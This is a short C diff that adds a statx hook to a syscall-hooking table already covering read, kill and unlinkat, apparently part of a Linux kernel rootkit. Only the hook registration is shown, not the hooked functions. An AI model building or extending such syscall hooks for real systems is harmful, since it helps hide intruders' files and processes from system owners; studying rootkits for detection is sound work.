@@ -15,6 +15,7 @@ int hooking_init(void) {
     hooks[HOOKIDX_READ].hooked       = (unsigned long)hooked_read;
     hooks[HOOKIDX_KILL].hooked       = (unsigned long)hooked_kill;
     hooks[HOOKIDX_UNLINKAT].hooked   = (unsigned long)hooked_unlinkat;
+    hooks[HOOKIDX_STATX].hooked      = (unsigned long)hooked_statx;
 
     for (i = 0; i < hooks_count; i++) {
         if (hooks[i].table_entry) {
